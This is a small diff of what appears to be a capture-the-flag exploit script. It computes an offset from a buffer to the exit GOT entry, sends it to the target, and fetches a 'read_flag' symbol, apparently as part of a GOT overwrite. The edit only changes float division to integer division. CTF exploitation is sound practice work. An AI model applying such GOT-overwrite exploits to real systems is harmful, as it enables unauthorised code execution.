@@ -35,7 +35,7 @@ def main():
     success(f'The exit got entry is at {hex(exit_got)}')
     buff = 0x4040a0
     info(f'The buff is at {hex(buff)}')
-    num = int((exit_got - buff) / 8)
+    num = (exit_got - buff) // 8
     info(f'Passing number {num}')
     r.sendlineafter(b'>>', f'{num}'.encode('ascii'))
     read_flag = e.symbols['read_flag']
